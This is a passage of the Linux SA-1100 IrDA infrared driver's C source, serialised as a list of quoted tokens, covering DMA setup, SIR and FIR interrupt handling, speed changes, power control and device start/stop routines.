"possible", ",", "and", "get", "the", "receiver", "setup", ".", "*", "We", "use", "the", "existing", "buffer", ".", "*", "/", "static", "void", "sa1100_irda_rx_dma_start", "(", "struct", "sa1100_irda", "*", "si", ")", "{", "if", "(", "!", "si", "-", ">", "dma_rx", ".", "skb", ")", "{", "printk", "(", "KERN_ERR", "\"", "sa1100_ir", ":", "rx", "buffer", "went", "missing", "\\", "n", "\"", ");", "return", ";", "}", "/", "*", "*", "First", "empty", "receive", "FIFO", "*", "/", "Ser2HSCR0", "=", "HSCR0_HSSP", ";", "/", "*", "*", "Enable", "the", "DMA", ",", "receiver", "and", "receive", "interrupt", ".", "*", "/", "dmaengine_terminate_all", "(", "si", "-", ">", "dma_rx", ".", "chan", ")", ";", "sa1100_irda_dma_start", "(", "&", "si", "-", ">", "dma_rx", ",", "DMA_DEV_TO_MEM", ",", "NULL", ",", "NULL", ")", ";", "Ser2HSCR0", "=", "HSCR0_HSSP", "|", "HSCR0_RXE", ";", "}", "static", "void", "sa1100_irda_check_speed", "(", "struct", "sa1100_irda", "*", "si", ")", "{", "if", "(", "si", "-", ">", "newspeed", ")", "{", "sa1100_irda_set_speed", "(", "si", ",", "si", "-", ">", "newspeed", ")", ";", "si", "-", ">", "newspeed", "=", "0", ";", "}", "}", "/", "*", "*", "HP", "-", "SIR", "format", "support", ".", "*", "/", "static", "void", "sa1100_irda_sirtxdma_irq", "(", "void", "*", "id", ")", "{", "struct", "net_device", "*", "dev", "=", "id", ";", "struct", "sa1100_irda", "*", "si", "=", "netdev_priv", "(", "dev", ")", ";", "dma_unmap_sg", "(", "si", "-", ">", "dma_tx", ".", "dev", ",", "&", "si", "-", ">", "dma_tx", ".", "sg", ",", "1", ",", "DMA_TO_DEVICE", ")", ";", "dev_kfree_skb", "(", "si", "-", ">", "dma_tx", ".", "skb", ")", ";", "si", "-", ">", "dma_tx", ".", "skb", "=", "NULL", ";", "dev", "-", ">", "stats", ".", "tx_packets", "+", "+;", "dev", "-", ">", "stats", ".", "tx_bytes", "+", "=", "sg_dma_len", "(", "&", "si", "-", ">", "dma_tx", ".", "sg", ")", ";", "/", "*", "We", "need", "to", "ensure", "that", "the", "transmitter", "has", "finished", ".", "*", "/", "do", "rmb", "(", ");", "while", "(", "Ser2UTSR1", "&", "UTSR1_TBY", ")", ";", "/", "*", "*", "Ok", ",", "we", "'", "ve", "finished", "transmitting", ".", "Now", "enable", "the", "receiver", ".", "*", "Sometimes", "we", "get", "a", "receive", "IRQ", "immediately", "after", "a", "transmit", ".", "..", "*", "/", "Ser2UTSR0", "=", "UTSR0_REB", "|", "UTSR0_RBB", "|", "UTSR0_RID", ";", "Ser2UTCR3", "=", "UTCR3_RIE", "|", "UTCR3_RXE", "|", "UTCR3_TXE", ";", "sa1100_irda_check_speed", "(", "si", ")", ";", "/", "*", "I", "'", "m", "hungry", "!", "*", "/", "netif_wake_queue", "(", "dev", ")", ";", "}", "static", "int", "sa1100_irda_sir_tx_start", "(", "struct", "sk_buff", "*", "skb", ",", "struct", "net_device", "*", "dev", ",", "struct", "sa1100_irda", "*", "si", ")", "{", "si", "-", ">", "tx_buff", ".", "data", "=", "si", "-", ">", "tx_buff", ".", "head", ";", "si", "-", ">", "tx_buff", ".", "len", "=", "async_wrap_skb", "(", "skb", ",", "si", "-", ">", "tx_buff", ".", "data", ",", "si", "-", ">", "tx_buff", ".", "truesize", ")", ";", "si", "-", ">", "dma_tx", ".", "skb", "=", "skb", ";", "sg_set_buf", "(", "&", "si", "-", ">", "dma_tx", ".", "sg", ",", "si", "-", ">", "tx_buff", ".", "data", ",", "si", "-", ">", "tx_buff", ".", "len", ")", ";", "if", "(", "dma_map_sg", "(", "si", "-", ">", "dma_tx", ".", "dev", ",", "&", "si", "-", ">", "dma_tx", ".", "sg", ",", "1", ",", "DMA_TO_DEVICE", ")", "=", "=", "0", ")", "{", "si", "-", ">", "dma_tx", ".", "skb", "=", "NULL", ";", "netif_wake_queue", "(", "dev", ")", ";", "dev", "-", ">", "stats", ".", "tx_dropped", "+", "+;", "return", "NETDEV_TX_OK", ";", "}", "sa1100_irda_dma_start", "(", "&", "si", "-", ">", "dma_tx", ",", "DMA_MEM_TO_DEV", ",", "sa1100_irda_sirtxdma_irq", ",", "dev", ")", ";", "/", "*", "*", "The", "mean", "turn", "-", "around", "time", "is", "enforced", "by", "XBOF", "padding", ",", "*", "so", "we", "don", "'", "t", "have", "to", "do", "anything", "special", "here", ".", "*", "/", "Ser2UTCR3", "=", "UTCR3_TXE", ";", "return", "NETDEV_TX_OK", ";", "}", "static", "irqreturn_t", "sa1100_irda_sir_irq", "(", "struct", "net_device", "*", "dev", ",", "struct", "sa1100_irda", "*", "si", ")", "{", "int", "status", ";", "status", "=", "Ser2UTSR0", ";", "/", "*", "*", "Deal", "with", "any", "receive", "errors", "first", ".", "The", "bytes", "in", "error", "may", "be", "*", "the", "only", "bytes", "in", "the", "receive", "FIFO", ",", "so", "we", "do", "this", "first", ".", "*", "/", "while", "(", "status", "&", "UTSR0_EIF", ")", "{", "int", "stat", ",", "data", ";", "stat", "=", "Ser2UTSR1", ";", "data", "=", "Ser2UTDR", ";", "if", "(", "stat", "&", "(", "UTSR1_FRE", "|", "UTSR1_ROR", ")", ")", "{", "dev", "-", ">", "stats", ".", "rx_errors", "+", "+;", "if", "(", "stat", "&", "UTSR1_FRE", ")", "dev", "-", ">", "stats", ".", "rx_frame_errors", "+", "+;", "if", "(", "stat", "&", "UTSR1_ROR", ")", "dev", "-", ">", "stats", ".", "rx_fifo_errors", "+", "+;", "}", "else", "async_unwrap_char", "(", "dev", ",", "&", "dev", "-", ">", "stats", ",", "&", "si", "-", ">", "rx_buff", ",", "data", ")", ";", "status", "=", "Ser2UTSR0", ";", "}", "/", "*", "*", "We", "must", "clear", "certain", "bits", ".", "*", "/", "Ser2UTSR0", "=", "status", "&", "(", "UTSR0_RID", "|", "UTSR0_RBB", "|", "UTSR0_REB", ")", ";", "if", "(", "status", "&", "UTSR0_RFS", ")", "{", "/", "*", "*", "There", "are", "at", "least", "4", "bytes", "in", "the", "FIFO", ".", "Read", "3", "bytes", "*", "and", "leave", "the", "rest", "to", "the", "block", "below", ".", "*", "/", "async_unwrap_char", "(", "dev", ",", "&", "dev", "-", ">", "stats", ",", "&", "si", "-", ">", "rx_buff", ",", "Ser2UTDR", ")", ";", "async_unwrap_char", "(", "dev", ",", "&", "dev", "-", ">", "stats", ",", "&", "si", "-", ">", "rx_buff", ",", "Ser2UTDR", ")", ";", "async_unwrap_char", "(", "dev", ",", "&", "dev", "-", ">", "stats", ",", "&", "si", "-", ">", "rx_buff", ",", "Ser2UTDR", ")", ";", "}", "if", "(", "status", "&", "(", "UTSR0_RFS", "|", "UTSR0_RID", ")", ")", "{", "/", "*", "*", "Fifo", "contains", "more", "than", "1", "character", ".", "*", "/", "do", "{", "async_unwrap_char", "(", "dev", ",", "&", "dev", "-", ">", "stats", ",", "&", "si", "-", ">", "rx_buff", ",", "Ser2UTDR", ")", ";", "}", "while", "(", "Ser2UTSR1", "&", "UTSR1_RNE", ")", ";", "}", "return", "IRQ_HANDLED", ";", "}", "/", "*", "*", "FIR", "format", "support", ".", "*", "/", "static", "void", "sa1100_irda_firtxdma_irq", "(", "void", "*", "id", ")", "{", "struct", "net_device", "*", "dev", "=", "id", ";", "struct", "sa1100_irda", "*", "si", "=", "netdev_priv", "(", "dev", ")", ";", "struct", "sk_buff", "*", "skb", ";", "/", "*", "*", "Wait", "for", "the", "transmission", "to", "complete", ".", "Unfortunately", ",", "*", "the", "hardware", "doesn", "'", "t", "give", "us", "an", "interrupt", "to", "indicate", "*", "\"", "end", "of", "frame", "\"", ".", "*", "/", "do", "rmb", "(", ");", "while", "(", "!(", "Ser2HSSR0", "&", "HSSR0_TUR", ")", "|", "|", "Ser2HSSR1", "&", "HSSR1_TBY", ")", ";", "/", "*", "*", "Clear", "the", "transmit", "underrun", "bit", ".", "*", "/", "Ser2HSSR0", "=", "HSSR0_TUR", ";", "/", "*", "*", "Do", "we", "need", "to", "change", "speed", "?", "Note", "that", "we", "'", "re", "lazy", "*", "here", "-", "we", "don", "'", "t", "free", "the", "old", "dma_rx", ".", "skb", ".", "We", "don", "'", "t", "need", "*", "to", "allocate", "a", "buffer", "either", ".", "*", "/", "sa1100_irda_check_speed", "(", "si", ")", ";", "/", "*", "*", "Start", "reception", ".", "This", "disables", "the", "transmitter", "for", "*", "us", ".", "This", "will", "be", "using", "the", "existing", "RX", "buffer", ".", "*", "/", "sa1100_irda_rx_dma_start", "(", "si", ")", ";", "/", "*", "Account", "and", "free", "the", "packet", ".", "*", "/", "skb", "=", "si", "-", ">", "dma_tx", ".", "skb", ";", "if", "(", "skb", ")", "{", "dma_unmap_sg", "(", "si", "-", ">", "dma_tx", ".", "dev", ",", "&", "si", "-", ">", "dma_tx", ".", "sg", ",", "1", ",", "DMA_TO_DEVICE", ")", ";", "dev", "-", ">", "stats", ".", "tx_packets", "+", "+;", "dev", "-", ">", "stats", ".", "tx_bytes", "+", "=", "skb", "-", ">", "len", ";", "dev_kfree_skb_irq", "(", "skb", ")", ";", "si", "-", ">", "dma_tx", ".", "skb", "=", "NULL", ";", "}", "/", "*", "*", "Make", "sure", "that", "the", "TX", "queue", "is", "available", "for", "sending", "*", "(", "for", "retries", ")", ".", "TX", "has", "priority", "over", "RX", "at", "all", "times", ".", "*", "/", "netif_wake_queue", "(", "dev", ")", ";", "}", "static", "int", "sa1100_irda_fir_tx_start", "(", "struct", "sk_buff", "*", "skb", ",", "struct", "net_device", "*", "dev", ",", "struct", "sa1100_irda", "*", "si", ")", "{", "int", "mtt", "=", "irda_get_mtt", "(", "skb", ")", ";", "si", "-", ">", "dma_tx", ".", "skb", "=", "skb", ";", "sg_set_buf", "(", "&", "si", "-", ">", "dma_tx", ".", "sg", ",", "skb", "-", ">", "data", ",", "skb", "-", ">", "len", ")", ";", "if", "(", "dma_map_sg", "(", "si", "-", ">", "dma_tx", ".", "dev", ",", "&", "si", "-", ">", "dma_tx", ".", "sg", ",", "1", ",", "DMA_TO_DEVICE", ")", "=", "=", "0", ")", "{", "si", "-", ">", "dma_tx", ".", "skb", "=", "NULL", ";", "netif_wake_queue", "(", "dev", ")", ";", "dev", "-", ">", "stats", ".", "tx_dropped", "+", "+;", "dev_kfree_skb", "(", "skb", ")", ";", "return", "NETDEV_TX_OK", ";", "}", "sa1100_irda_dma_start", "(", "&", "si", "-", ">", "dma_tx", ",", "DMA_MEM_TO_DEV", ",", "sa1100_irda_firtxdma_irq", ",", "dev", ")", ";", "/", "*", "*", "If", "we", "have", "a", "mean", "turn", "-", "around", "time", ",", "impose", "the", "specified", "*", "specified", "delay", ".", "We", "could", "shorten", "this", "by", "timing", "from", "*", "the", "point", "we", "received", "the", "packet", ".", "*", "/", "if", "(", "mtt", ")", "udelay", "(", "mtt", ")", ";", "Ser2HSCR0", "=", "HSCR0_HSSP", "|", "HSCR0_TXE", ";", "return", "NETDEV_TX_OK", ";", "}", "static", "void", "sa1100_irda_fir_error", "(", "struct", "sa1100_irda", "*", "si", ",", "struct", "net_device", "*", "dev", ")", "{", "struct", "sk_buff", "*", "skb", "=", "si", "-", ">", "dma_rx", ".", "skb", ";", "unsigned", "int", "len", ",", "stat", ",", "data", ";", "if", "(", "!", "skb", ")", "{", "printk", "(", "KERN_ERR", "\"", "sa1100_ir", ":", "SKB", "is", "NULL", "!", "\\", "n", "\"", ");", "return", ";", "}", "/", "*", "*", "Get", "the", "current", "data", "position", ".", "*", "/", "len", "=", "sa1100_irda_dma_xferred", "(", "&", "si", "-", ">", "dma_rx", ")", ";", "if", "(", "len", ">", "HPSIR_MAX_RXLEN", ")", "len", "=", "HPSIR_MAX_RXLEN", ";", "dma_unmap_sg", "(", "si", "-", ">", "dma_rx", ".", "dev", ",", "&", "si", "-", ">", "dma_rx", ".", "sg", ",", "1", ",", "DMA_FROM_DEVICE", ")", ";", "do", "{", "/", "*", "*", "Read", "Status", ",", "and", "then", "Data", ".", "*", "/", "stat", "=", "Ser2HSSR1", ";", "rmb", "(", ");", "data", "=", "Ser2HSDR", ";", "if", "(", "stat", "&", "(", "HSSR1_CRE", "|", "HSSR1_ROR", ")", ")", "{", "dev", "-", ">", "stats", ".", "rx_errors", "+", "+;", "if", "(", "stat", "&", "HSSR1_CRE", ")", "dev", "-", ">", "stats", ".", "rx_crc_errors", "+", "+;", "if", "(", "stat", "&", "HSSR1_ROR", ")", "dev", "-", ">", "stats", ".", "rx_frame_errors", "+", "+;", "}", "else", "skb", "-", ">", "data", "[", "len", "+", "+]", "=", "data", ";", "/", "*", "*", "If", "we", "hit", "the", "end", "of", "frame", ",", "there", "'", "s", "*", "no", "point", "in", "continuing", ".", "*", "/", "if", "(", "stat", "&", "HSSR1_EOF", ")", "break", ";", "}", "while", "(", "Ser2HSSR0", "&", "HSSR0_EIF", ")", ";", "if", "(", "stat", "&", "HSSR1_EOF", ")", "{", "si", "-", ">", "dma_rx", ".", "skb", "=", "NULL", ";", "skb_put", "(", "skb", ",", "len", ")", ";", "skb", "-", ">", "dev", "=", "dev", ";", "skb_reset_mac_header", "(", "skb", ")", ";", "skb", "-", ">", "protocol", "=", "htons", "(", "ETH_P_IRDA", ")", ";", "dev", "-", ">", "stats", ".", "rx_packets", "+", "+;", "dev", "-", ">", "stats", ".", "rx_bytes", "+", "=", "len", ";", "/", "*", "*", "Before", "we", "pass", "the", "buffer", "up", ",", "allocate", "a", "new", "one", ".", "*", "/", "sa1100_irda_rx_alloc", "(", "si", ")", ";", "netif_rx", "(", "skb", ")", ";", "}", "else", "{", "/", "*", "*", "Remap", "the", "buffer", "-", "it", "was", "previously", "mapped", ",", "and", "we", "*", "hope", "that", "this", "succeeds", ".", "*", "/", "dma_map_sg", "(", "si", "-", ">", "dma_rx", ".", "dev", ",", "&", "si", "-", ">", "dma_rx", ".", "sg", ",", "1", ",", "DMA_FROM_DEVICE", ")", ";", "}", "}", "/", "*", "*", "We", "only", "have", "to", "handle", "RX", "events", "here", ";", "transmit", "events", "go", "via", "the", "TX", "*", "DMA", "handler", ".", "We", "disable", "RX", ",", "process", ",", "and", "the", "restart", "RX", ".", "*", "/", "static", "irqreturn_t", "sa1100_irda_fir_irq", "(", "struct", "net_device", "*", "dev", ",", "struct", "sa1100_irda", "*", "si", ")", "{", "/", "*", "*", "Stop", "RX", "DMA", "*", "/", "dmaengine_pause", "(", "si", "-", ">", "dma_rx", ".", "chan", ")", ";", "/", "*", "*", "Framing", "error", "-", "we", "throw", "away", "the", "packet", "completely", ".", "*", "Clearing", "RXE", "flushes", "the", "error", "conditions", "and", "data", "*", "from", "the", "fifo", ".", "*", "/", "if", "(", "Ser2HSSR0", "&", "(", "HSSR0_FRE", "|", "HSSR0_RAB", ")", ")", "{", "dev", "-", ">", "stats", ".", "rx_errors", "+", "+;", "if", "(", "Ser2HSSR0", "&", "HSSR0_FRE", ")", "dev", "-", ">", "stats", ".", "rx_frame_errors", "+", "+;", "/", "*", "*", "Clear", "out", "the", "DMA", ".", "..", "*", "/", "Ser2HSCR0", "=", "HSCR0_HSSP", ";", "/", "*", "*", "Clear", "selected", "status", "bits", "now", ",", "so", "we", "*", "don", "'", "t", "miss", "them", "next", "time", "around", ".", "*", "/", "Ser2HSSR0", "=", "HSSR0_FRE", "|", "HSSR0_RAB", ";", "}", "/", "*", "*", "Deal", "with", "any", "receive", "errors", ".", "The", "any", "of", "the", "lowest", "*", "8", "bytes", "in", "the", "FIFO", "may", "contain", "an", "error", ".", "We", "must", "read", "*", "them", "one", "by", "one", ".", "The", "\"", "error", "\"", "could", "even", "be", "the", "end", "of", "*", "packet", "!", "*", "/", "if", "(", "Ser2HSSR0", "&", "HSSR0_EIF", ")", "sa1100_irda_fir_error", "(", "si", ",", "dev", ")", ";", "/", "*", "*", "No", "matter", "what", "happens", ",", "we", "must", "restart", "reception", ".", "*", "/", "sa1100_irda_rx_dma_start", "(", "si", ")", ";", "return", "IRQ_HANDLED", ";", "}", "/", "*", "*", "Set", "the", "IrDA", "communications", "speed", ".", "*", "/", "static", "int", "sa1100_irda_set_speed", "(", "struct", "sa1100_irda", "*", "si", ",", "int", "speed", ")", "{", "unsigned", "long", "flags", ";", "int", "brd", ",", "ret", "=", "-", "EINVAL", ";", "switch", "(", "speed", ")", "{", "case", "9600", ":", "case", "19200", ":", "case", "38400", ":", "case", "57600", ":", "case", "115200", ":", "brd", "=", "3686400", "/", "(", "16", "*", "speed", ")", "-", "1", ";", "/", "*", "Stop", "the", "receive", "DMA", ",", "and", "configure", "transmit", ".", "*", "/", "if", "(", "IS_FIR", "(", "si", ")", ")", "{", "dmaengine_terminate_all", "(", "si", "-", ">", "dma_rx", ".", "chan", ")", ";", "dmaengine_slave_config", "(", "si", "-", ">", "dma_tx", ".", "chan", ",", "&", "sa1100_irda_sir_tx", ")", ";", "}", "local_irq_save", "(", "flags", ")", ";", "Ser2UTCR3", "=", "0", ";", "Ser2HSCR0", "=", "HSCR0_UART", ";", "Ser2UTCR1", "=", "brd", ">", ">", "8", ";", "Ser2UTCR2", "=", "brd", ";", "/", "*", "*", "Clear", "status", "register", "*", "/", "Ser2UTSR0", "=", "UTSR0_REB", "|", "UTSR0_RBB", "|", "UTSR0_RID", ";", "Ser2UTCR3", "=", "UTCR3_RIE", "|", "UTCR3_RXE", "|", "UTCR3_TXE", ";", "if", "(", "si", "-", ">", "pdata", "-", ">", "set_speed", ")", "si", "-", ">", "pdata", "-", ">", "set_speed", "(", "si", "-", ">", "dev", ",", "speed", ")", ";", "si", "-", ">", "speed", "=", "speed", ";", "si", "-", ">", "tx_start", "=", "sa1100_irda_sir_tx_start", ";", "si", "-", ">", "irq", "=", "sa1100_irda_sir_irq", ";", "local_irq_restore", "(", "flags", ")", ";", "ret", "=", "0", ";", "break", ";", "case", "4000000", ":", "if", "(", "!", "IS_FIR", "(", "si", ")", ")", "dmaengine_slave_config", "(", "si", "-", ">", "dma_tx", ".", "chan", ",", "&", "sa1100_irda_fir_tx", ")", ";", "local_irq_save", "(", "flags", ")", ";", "Ser2HSSR0", "=", "0xff", ";", "Ser2HSCR0", "=", "HSCR0_HSSP", ";", "Ser2UTCR3", "=", "0", ";", "si", "-", ">", "speed", "=", "speed", ";", "si", "-", ">", "tx_start", "=", "sa1100_irda_fir_tx_start", ";", "si", "-", ">", "irq", "=", "sa1100_irda_fir_irq", ";", "if", "(", "si", "-", ">", "pdata", "-", ">", "set_speed", ")", "si", "-", ">", "pdata", "-", ">", "set_speed", "(", "si", "-", ">", "dev", ",", "speed", ")", ";", "sa1100_irda_rx_alloc", "(", "si", ")", ";", "sa1100_irda_rx_dma_start", "(", "si", ")", ";", "local_irq_restore", "(", "flags", ")", ";", "break", ";", "default", ":", "break", ";", "}", "return", "ret", ";", "}", "/", "*", "*", "Control", "the", "power", "state", "of", "the", "IrDA", "transmitter", ".", "*", "State", ":", "*", "0", "-", "off", "*", "1", "-", "short", "range", ",", "lowest", "power", "*", "2", "-", "medium", "range", ",", "medium", "power", "*", "3", "-", "maximum", "range", ",", "high", "power", "*", "*", "Currently", ",", "only", "assabet", "is", "known", "to", "support", "this", ".", "*", "/", "static", "int", "__sa1100_irda_set_power", "(", "struct", "sa1100_irda", "*", "si", ",", "unsigned", "int", "state", ")", "{", "int", "ret", "=", "0", ";", "if", "(", "si", "-", ">", "pdata", "-", ">", "set_power", ")", "ret", "=", "si", "-", ">", "pdata", "-", ">", "set_power", "(", "si", "-", ">", "dev", ",", "state", ")", ";", "return", "ret", ";", "}", "static", "inline", "int", "sa1100_set_power", "(", "struct", "sa1100_irda", "*", "si", ",", "unsigned", "int", "state", ")", "{", "int", "ret", ";", "ret", "=", "__sa1100_irda_set_power", "(", "si", ",", "state", ")", ";", "if", "(", "ret", "=", "=", "0", ")", "si", "-", ">", "power", "=", "state", ";", "return", "ret", ";", "}", "static", "irqreturn_t", "sa1100_irda_irq", "(", "int", "irq", ",", "void", "*", "dev_id", ")", "{", "struct", "net_device", "*", "dev", "=", "dev_id", ";", "struct", "sa1100_irda", "*", "si", "=", "netdev_priv", "(", "dev", ")", ";", "return", "si", "-", ">", "irq", "(", "dev", ",", "si", ")", ";", "}", "static", "int", "sa1100_irda_hard_xmit", "(", "struct", "sk_buff", "*", "skb", ",", "struct", "net_device", "*", "dev", ")", "{", "struct", "sa1100_irda", "*", "si", "=", "netdev_priv", "(", "dev", ")", ";", "int", "speed", "=", "irda_get_next_speed", "(", "skb", ")", ";", "/", "*", "*", "Does", "this", "packet", "contain", "a", "request", "to", "change", "the", "interface", "*", "speed", "?", "If", "so", ",", "remember", "it", "until", "we", "complete", "the", "transmission", "*", "of", "this", "frame", ".", "*", "/", "if", "(", "speed", "!", "=", "si", "-", ">", "speed", "&", "&", "speed", "!", "=", "-", "1", ")", "si", "-", ">", "newspeed", "=", "speed", ";", "/", "*", "If", "this", "is", "an", "empty", "frame", ",", "we", "can", "bypass", "a", "lot", ".", "*", "/", "if", "(", "skb", "-", ">", "len", "=", "=", "0", ")", "{", "sa1100_irda_check_speed", "(", "si", ")", ";", "dev_kfree_skb", "(", "skb", ")", ";", "return", "NETDEV_TX_OK", ";", "}", "netif_stop_queue", "(", "dev", ")", ";", "/", "*", "We", "must", "not", "already", "have", "a", "skb", "to", "transmit", ".", "..", "*", "/", "BUG_ON", "(", "si", "-", ">", "dma_tx", ".", "skb", ")", ";", "return", "si", "-", ">", "tx_start", "(", "skb", ",", "dev", ",", "si", ")", ";", "}", "static", "int", "sa1100_irda_ioctl", "(", "struct", "net_device", "*", "dev", ",", "struct", "ifreq", "*", "ifreq", ",", "int", "cmd", ")", "{", "struct", "if_irda_req", "*", "rq", "=", "(", "struct", "if_irda_req", "*", ")", "ifreq", ";", "struct", "sa1100_irda", "*", "si", "=", "netdev_priv", "(", "dev", ")", ";", "int", "ret", "=", "-", "EOPNOTSUPP", ";", "switch", "(", "cmd", ")", "{", "case", "SIOCSBANDWIDTH", ":", "if", "(", "capable", "(", "CAP_NET_ADMIN", ")", ")", "{", "/", "*", "*", "We", "are", "unable", "to", "set", "the", "speed", "if", "the", "*", "device", "is", "not", "running", ".", "*", "/", "if", "(", "si", "-", ">", "open", ")", "{", "ret", "=", "sa1100_irda_set_speed", "(", "si", ",", "rq", "-", ">", "ifr_baudrate", ")", ";", "}", "else", "{", "printk", "(", "\"", "sa1100_irda_ioctl", ":", "SIOCSBANDWIDTH", ":", "!", "netif_running", "\\", "n", "\"", ");", "ret", "=", "0", ";", "}", "}", "break", ";", "case", "SIOCSMEDIABUSY", ":", "ret", "=", "-", "EPERM", ";", "if", "(", "capable", "(", "CAP_NET_ADMIN", ")", ")", "{", "irda_device_set_media_busy", "(", "dev", ",", "TRUE", ")", ";", "ret", "=", "0", ";", "}", "break", ";", "case", "SIOCGRECEIVING", ":", "rq", "-", ">", "ifr_receiving", "=", "IS_FIR", "(", "si", ")", "?", "0", ":", "si", "-", ">", "rx_buff", ".", "state", "!", "=", "OUTSIDE_FRAME", ";", "break", ";", "default", ":", "break", ";", "}", "return", "ret", ";", "}", "static", "int", "sa1100_irda_startup", "(", "struct", "sa1100_irda", "*", "si", ")", "{", "int", "ret", ";", "/", "*", "*", "Ensure", "that", "the", "ports", "for", "this", "device", "are", "setup", "correctly", ".", "*", "/", "if", "(", "si", "-", ">", "pdata", "-", ">", "startup", ")", "{", "ret", "=", "si", "-", ">", "pdata", "-", ">", "startup", "(", "si", "-", ">", "dev", ")", ";", "if", "(", "ret", ")", "return", "ret", ";", "}", "/", "*", "*", "Configure", "PPC", "for", "IRDA", "-", "we", "want", "to", "drive", "TXD2", "low", ".", "*", "We", "also", "want", "to", "drive", "this", "pin", "low", "during", "sleep", ".", "*", "/", "PPSR", "&", "=", "~", "PPC_TXD2", ";", "PSDR", "&", "=", "~", "PPC_TXD2", ";", "PPDR", "|", "=", "PPC_TXD2", ";", "/", "*", "*", "Enable", "HP", "-", "SIR", "modulation", ",", "and", "ensure", "that", "the", "port", "is", "disabled", ".", "*", "/", "Ser2UTCR3", "=", "0", ";", "Ser2HSCR0", "=", "HSCR0_UART", ";", "Ser2UTCR4", "=", "si", "-", ">", "utcr4", ";", "Ser2UTCR0", "=", "UTCR0_8BitData", ";", "Ser2HSCR2", "=", "HSCR2_TrDataH", "|", "HSCR2_RcDataL", ";", "/", "*", "*", "Clear", "status", "register", "*", "/", "Ser2UTSR0", "=", "UTSR0_REB", "|", "UTSR0_RBB", "|", "UTSR0_RID", ";", "ret", "=", "sa1100_irda_set_speed", "(", "si", ",", "si", "-", ">", "speed", "=", "9600", ")", ";", "if", "(", "ret", ")", "{", "Ser2UTCR3", "=", "0", ";", "Ser2HSCR0", "=", "0", ";", "if", "(", "si", "-", ">", "pdata", "-", ">", "shutdown", ")", "si", "-", ">", "pdata", "-", ">", "shutdown", "(", "si", "-", ">", "dev", ")", ";", "}", "return", "ret", ";", "}", "static", "void", "sa1100_irda_shutdown", "(", "struct", "sa1100_irda", "*", "si", ")", "{", "/", "*", "*", "Stop", "all", "DMA", "activity", ".", "*", "/", "dmaengine_terminate_all", "(", "si", "-", ">", "dma_rx", ".", "chan", ")", ";", "dmaengine_terminate_all", "(", "si", "-", ">", "dma_tx", ".", "chan", ")", ";", "/", "*", "Disable", "the", "port", ".", "*", "/", "Ser2UTCR3", "=", "0", ";", "Ser2HSCR0", "=", "0", ";", "if", "(", "si", "-", ">", "pdata", "-", ">", "shutdown", ")", "si", "-", ">", "pdata", "-", ">", "shutdown", "(", "si", "-", ">", "dev", ")", ";", "}", "static", "int", "sa1100_irda_start", "(", "struct", "net_device", "*", "dev", ")", "{", "struct", "sa1100_irda", "*", "si", "=", "netdev_priv", "(", "dev", ")", ";", "int", "err", ";", "si", "-", ">", "speed", "=", "9600", ";", "err", "=", "sa1100_irda_dma_request", "(", "si", "-", ">", "dev", ",", "&", "si", "-", ">", "dma_rx", ",", "\"", "Ser2ICPRc", "\"", ",", "&", "sa1100_irda_fir_rx", ")", ";", "if", "(", "err", ")", "goto", "err_rx_dma", ";", "err", "=", "sa1100_irda_dma_request", "(", "si", "-", ">", "dev", ",", "&", "si", "-", ">", "dma_tx", ",", "\"", "Ser2ICPTr", "\"", ",", "&", "sa1100_irda_sir_tx", ")", ";", "if", "(", "err", ")", "goto", "err_tx_dma", ";", "/", "*", "*", "Setup", "the", "serial", "port", "for", "the", "specified", "speed", ".", "*", "/", "err", "=", "sa1100_irda_startup", "(", "si", ")", ";", "if", "(", "err", ")", "goto", "err_startup", ";", "/", "*", "*", "Open", "a", "new", "IrLAP", "layer", "instance", ".", "*", "/", "si", "-", ">", "irlap", "=", "irlap_open", "(", "dev", ",", "&", "si", "-", ">", "qos", ",", "\"", "sa1100", "\"", ");", "err", "=", "-", "ENOMEM", ";", "if", "(", "!", "si", "-", ">", "irlap", ")", "goto", "err_irlap", ";", "err", "=", "request_irq", "(", "dev", "-", ">", "irq", ",", "sa1100_irda_irq", ",", "0", ",", "dev", "-", ">", "name", ",", "dev", ")", ";", "if", "(", "err", ")", "goto", "err_irq", ";", "/", "*", "*", "Now", "enable", "the", "interrupt", "and", "start", "the", "queue", "*", "/", "si", "-", ">", "open", "=", "1", ";", "sa1100_set_power", "(", "si", ",", "power_level", ")", ";", "/", "*", "low", "power", "mode", "*", "/", "netif_start_queue", "(", "dev", ")", ";", "return", "0", ";", "err_irq", ":", "irlap_close", "(", "si", "-", ">", "irlap", ")", ";", "err_irlap", ":", "si", "-", ">", "open", "=", "0", ";", "sa1100_irda_shutdown", "(", "si", ")", ";", "err_startup", ":", "dma_release_channel", "(", "si", "-", ">", "dma_tx", ".", "chan", ")", ";", "err_tx_dma", ":", "dma_release_channel", "(", "si", "-", ">", "dma_rx", ".", "chan", ")", ";", "err_rx_dma", ":", "return", "err", ";", "}", "static", "int", "sa1100_irda_stop", "(", "struct", "net_device", "*", "dev", ")", "{", "struct", "sa1100_irda", "*", "si", "=", "netdev_priv", "(", "dev", ")", ";", "struct", "sk_buff", "*", "skb", ";", "netif_stop_queue", "(", "dev", ")", ";", "si", "-", ">", "open", "=", "0", ";", "sa1100_irda_shutdown", "(", "si", ")", ";", "/", "*", "*", "If", "we", "have", "been", "doing", "any", "DMA", "activity", ",", "make", "sure", "we", "*", "tidy", "that", "up", "cleanly", ".", "*", "/", "skb", "=", "si", "-", ">", "dma_rx", ".", "skb", ";", "if", "(", "skb", ")", "{", "dma_unmap_sg", "(", "si", "-", ">", "dma_rx", ".", "dev", ",", "&", "si", "-", ">", "dma_rx", ".", "sg", ",", "1", ",", "DMA_FROM_DEVICE", ")", ";", "dev_kfree_skb", "(", "skb", ")", ";", "si", "-", ">", "dma_rx", ".", "skb", "=", "NULL", ";", "}", "skb", "=", "si", "-", ">", "dma_tx", ".", "skb", ";", "if", "(", "skb", ")", "{", "dma_unmap_sg", "(", "si", "-", ">", "dma_tx", ".", "dev", ",", "&", "si", "-", ">", "dma_tx", ".", "sg", ",", "1", ",", "DMA_TO_DEVICE", ")", ";", "dev_kfree_skb", "(", "skb", ")", ";", "si", "-", ">", "dma_tx", ".", "skb", "=", "NULL", ";", "}", "/", "*", "Stop", "IrLAP", "*", "/", "if", "(", "si", "-", ">", "irlap", ")", "{", "irlap_close", "(", "si", "-", ">", "irlap", ")", ";", "si", "-", ">", "irlap", "=", "NULL", ";", "}", "/", "*", "*", "Free", "resources", "*", "/", "dma_release_channel", "(", "si", "-", ">", "dma_tx", ".", "chan", ")", ";", "dma_release_channel", "(", "si", "-", ">", "dma_rx", ".", "chan", ")", ";", "free_irq", "(", "dev", "-", ">", "irq", ",", "dev", ")", ";", "sa1100_set_power", "(", "si", ",", "0", ")", ";", "return", 